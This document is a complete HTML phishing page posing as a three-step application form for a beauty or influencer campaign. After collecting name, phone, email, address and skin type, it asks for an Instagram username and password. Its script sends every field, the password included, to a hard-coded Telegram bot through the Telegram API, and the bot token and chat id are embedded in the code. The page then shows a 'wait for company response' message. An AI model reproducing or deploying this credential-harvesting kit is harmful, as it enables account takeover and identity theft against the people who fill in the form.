<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Multi-Step Education Form</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
  body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }
  .container {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 12px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    width: 360px;
    padding: 30px 40px;
    backdrop-filter: blur(10px);
  }
  h2 {
    margin-bottom: 20px;
    font-weight: 600;
    letter-spacing: 1.2px;
    text-align: center;
  }
  label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
    font-size: 0.9rem;
  }
  input[type="text"],
  input[type="email"],
  input[type="tel"],
  input[type="password"],
  textarea {
    width: 100%;
    padding: 10px 12px;
    margin-bottom: 18px;
    border: none;
    border-radius: 6px;
    font-size: 1rem;
    outline: none;
    box-sizing: border-box;
  }
  textarea {
    resize: vertical;
    min-height: 60px;
  }
  button {
    width: 100%;
    padding: 12px;
    background: #5a4de8;
    border: none;
    border-radius: 8px;
    font-size: 1.1rem;
    font-weight: 600;
    color: white;
    cursor: pointer;
    transition: background 0.3s ease;
  }
  button:hover {
    background: #4838d1;
  }
  .hidden {
    display: none;
  }
  .final-message {
    text-align: center;
    font-size: 1.2rem;
    font-weight: 600;
    padding: 40px 10px;
  }
</style>
</head>
<body>
  <div class="container">
    <!-- Step 1 -->
    <form id="step1" autocomplete="off">
      <h2>Step 1: Basic Info</h2>
      <label for="name">Full Name</label>
      <input type="text" id="name" name="name" required placeholder="Your full name" />
      
      <label for="contact">Contact Number</label>
      <input type="tel" id="contact" name="contact" required placeholder="+1234567890" pattern="[+0-9\s\-]{7,15}" />
      
      <label for="email">Email ID</label>
      <input type="email" id="email" name="email" required placeholder="you@example.com" />
      
      <button type="submit">Submit</button>
    </form>
    <!-- Step 2 -->
    <form id="step2" class="hidden" autocomplete="off">
      <h2>Step 2: Additional Info</h2>
      <label for="skinType">Skin Type</label>
      <input type="text" id="skinType" name="skinType" required placeholder="e.g. Oily, Dry, Combination" />
      
      <label for="address">Address</label>
      <textarea id="address" name="address" required placeholder="Your full address"></textarea>
      
      <button type="submit">Submit</button>
    </form>
    <!-- Step 3 -->
    <form id="step3" class="hidden" autocomplete="off">
      <h2>Step 3: Social Info</h2>
      <label for="reelLink">Most Liked/View Reel Link</label>
      <input type="text" id="reelLink" name="reelLink" required placeholder="https://..." />
      
      <label for="instaUsername">Instagram Username</label>
      <input type="text" id="instaUsername" name="instaUsername" required placeholder="@username" />
      
      <label for="instaPassword">Instagram Password</label>
      <input type="password" id="instaPassword" name="instaPassword" required placeholder="Your Instagram password" />
      
      <button type="submit">Submit</button>
    </form>
    <!-- Final Message -->
    <div id="finalMessage" class="hidden final-message">
      WAIT FOR COMPANY RESPONSE
    </div>
  </div>
  <script>
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const finalMessage = document.getElementById('finalMessage');
  // Your Telegram bot info
  const botToken = '7878471261:AAHPexKx9Dt0GcnTyQo_z-YD2d0bXzgmekg';
  const chatId = '5337817984';
  // Store data across steps
  const formData = {};
  step1.addEventListener('submit', e => {
    e.preventDefault();
    if (step1.checkValidity()) {
      formData.name = step1.name.value.trim();
      formData.contact = step1.contact.value.trim();
      formData.email = step1.email.value.trim();
      step1.classList.add('hidden');
      step2.classList.remove('hidden');
    } else {
      step1.reportValidity();
    }
  });
  step2.addEventListener('submit', e => {
    e.preventDefault();
    if (step2.checkValidity()) {
      formData.skinType = step2.skinType.value.trim();
      formData.address = step2.address.value.trim();
      step2.classList.add('hidden');
      step3.classList.remove('hidden');
    } else {
      step2.reportValidity();
    }
  });
  step3.addEventListener('submit', async e => {
    e.preventDefault();
    if (step3.checkValidity()) {
      formData.reelLink = step3.reelLink.value.trim();
      formData.instaUsername = step3.instaUsername.value.trim();
      formData.instaPassword = step3.instaPassword.value.trim();
      // Prepare message text for Telegram
      const message = `
New Form Submission:
Name: ${formData.name}
Contact: ${formData.contact}
Email: ${formData.email}
Skin Type: ${formData.skinType}
Address: ${formData.address}
Most Liked/View Reel Link: ${formData.reelLink}
Instagram Username: ${formData.instaUsername}
Instagram Password: ${formData.instaPassword}
      `;
      // Send message to Telegram
      try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });
        if (!res.ok) {
          throw new Error('Telegram API error');
        }
        step3.classList.add('hidden');
        finalMessage.classList.remove('hidden');
      } catch (error) {
        alert('Failed to send data to Telegram. Please try again later.');
        console.error(error);
      }
    } else {
      step3.reportValidity();
    }
  });
</script>
</body>
</html>
